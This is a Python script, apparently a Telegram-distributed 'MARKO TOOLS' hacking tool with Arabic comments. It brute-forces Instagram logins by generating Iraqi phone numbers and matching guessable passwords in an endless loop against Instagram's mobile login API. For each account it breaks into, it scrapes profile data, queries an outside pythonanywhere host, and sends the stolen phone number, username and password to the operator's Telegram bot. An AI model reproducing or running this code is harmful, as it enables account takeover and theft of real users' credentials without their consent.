#Tele : @YYYYJJYY
#By : @pmmvn
#-------------------------------
import requests
import random
from uuid import uuid4
import time
from user_agent import generate_user_agent
import user_agent
import telebot
from secrets import token_hex
import secrets
import uuid
from time import sleep
import os
from telebot import types
import sys
import pyfiglet

#-----متغيرات-----#
mr = 0
ko = 0
sc = 0
#-----متغيرات-----#
pass
#--------الالوان---------#
G = '\033[1;32m'
E = '\033[1;31m'
S = '\033[1;33m'
W = '\033[1;35m'
F = '\033[1;34m'
Y = '\033[1;36m'
#--------الالوان---------#
pass
#-----------------ارسال تلي-----------------#
ID = input(G+'Enter Id Bot : ')
token = input(G+'Enter Token Bot : ')

def code_Mark(userQ, password, username):
		cookie = secrets.token_hex(8) * 2
		head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
		url_id = f"https://www.instagram.com/{userQ}/?__a=1"
		req_id = requests.get(url_id, headers=head).json()
		name = str(req_id['graphql']['user']['full_name'])
		id = str(req_id['graphql']['user']['id'])
		followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
		following = str(req_id['graphql']['user']['edge_follow']['count'])
		isp = str(req_id['graphql']['user']['is_private'])
		bio = str(req_id['graphql']['user']['biography'])
		re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
		ree = re.json()
		dat = ree['data']
		mret = (f"""
New Acouunt Instagarm Hits⚡🔥
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⚡ name ⚡ : {name}
⚡ user ⚡ : {userQ}
⚡ num ⚡ : {username}
⚡ pass ⚡ : {password}
⚡ followers ⚡ : {followes}
⚡ following ⚡ : {following}
⚡ id ⚡ : {id}
⚡ bio ⚡ : {bio}
⚡ private ⚡ : {isp}
⚡ data ⚡ : {dat}
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
By Code - | - @pmmvn - | - @YYYJJYY """)
		tlg = (f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=\n {mret} \n""")
		i = requests.post(tlg)
		
#-----------
user = '1234567890'
url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
while True:
		k = ('7','8','5')
		us = str(''.join(random.choice(user) for i in range(8)))
		de = str(''.join(random.choice(k) for i in range(1)))
		username = '+9647'+de+us
		password = '07'+de+us
		uid = str(uuid4())
		data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
		req = requests.post(url, headers=headers, data=data)
		if 'logged_in_user' in req.json():
			mr+=1
			userQ = req.json()['logged_in_user']['username']
			code_Mark(userQ, password, username)
		elif '"message":"challenge_required","challenge"' in req.json():
			sc =+1
		else:
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""
{Y}-----------------------
{G} By - code < MARKO TOOLS >
{Y}-----------------------
{G} __  __    _    ____  _  _____  
{Y}|  \/  |  / \  |  _ \| |/ / _ \ 
{E}| |\/| | / _ \ | |_) | ' / | | |
{F}| |  | |/ ___ \|  _ <| . \ |_| |
{W}|_|  |_/_/   \_\_| \_\_|\_\___/ 

		{W} _____ ___   ___  _     ____  
		{E}|_   _/ _ \ / _ \| |   / ___| 
		{S}  | || | | | | | | |   \___ \ 
		{F}  | || |_| | |_| | |___ ___) |
		{G}  |_| \___/ \___/|_____|____/ 
{W}----------------------------------------------
{G}Telegram : @YYYYJJYY
{G}Telegram : @pmmvn
{W}----------------------------------------------
{E}({G}{username}{E})  {E}({G}{password}{E})
{W}----------------------------------------------
{G}Good : ({mr})
{E}Bad : ({ko})
{S}Suc : ({sc})
{W}----------------------------------------------
					""")
			ko+=1
			
else:
	mr+=1
